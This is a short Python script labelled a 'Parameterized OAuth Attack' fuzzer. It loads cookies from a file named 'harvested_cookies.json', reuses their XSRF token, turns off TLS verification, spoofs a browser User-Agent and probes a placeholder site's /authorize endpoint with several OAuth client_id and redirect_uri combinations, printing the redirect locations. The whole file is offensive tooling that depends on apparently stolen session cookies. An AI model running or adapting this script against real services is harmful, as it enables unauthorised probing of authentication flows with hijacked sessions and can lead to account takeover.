import json
import httpx
import warnings

warnings.filterwarnings("ignore")

COOKIE_FILE = "harvested_cookies.json"
BASE_URL = "https://yourtarget.com"

def fuzz_oauth_parameters():
    print("[*] Initializing Parameterized OAuth Attack...")
    
    try:
        with open(COOKIE_FILE, "r", encoding="utf-8") as f:
            cookies_list = json.load(f)
    except Exception as e:
        print(f"[!] Error loading {COOKIE_FILE}: {e}")
        return
        
    cookie_jar = {c['name']: c['value'] for c in cookies_list}
    xsrf_token = cookie_jar.get("XSRF-TOKEN", "")
    
    client = httpx.Client(verify=False, timeout=10.0, follow_redirects=False, cookies=cookie_jar)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    if xsrf_token:
        headers["X-XSRF-TOKEN"] = xsrf_token
        
    # Test permutations of standard OAuth/Cognito authorization parameters
    test_params = [
        {"response_type": "code", "client_id": "axis_web_client", "redirect_uri": "https://yourtarget.com/callback"},
        {"response_type": "token", "client_id": "axis_mobile", "redirect_uri": "https://yourtarget.com/oauth/callback"},
        {"response_type": "code", "client_id": "aws_cognito_default", "redirect_uri": "https://yourtarget.com"}
    ]
    
    print(f"[+] Testing {len(test_params)} parameter payloads against {BASE_URL}/authorize...\n")
    
    for i, params in enumerate(test_params, 1):
        url = f"{BASE_URL}/authorize"
        try:
            res = client.get(url, params=params, headers=headers)
            print(f"    -> Payload [{i}] | Status: {res.status_code}")
            location = res.headers.get("Location", "No Location")
            print(f"        Location: {location}\n")
        except httpx.RequestError as e:
            print(f"    -> Connection Error: {e}")
            
    client.close()
    print("[*] Parameterized OAuth fuzzer complete.")

if __name__ == "__main__":
    fuzz_oauth_parameters()
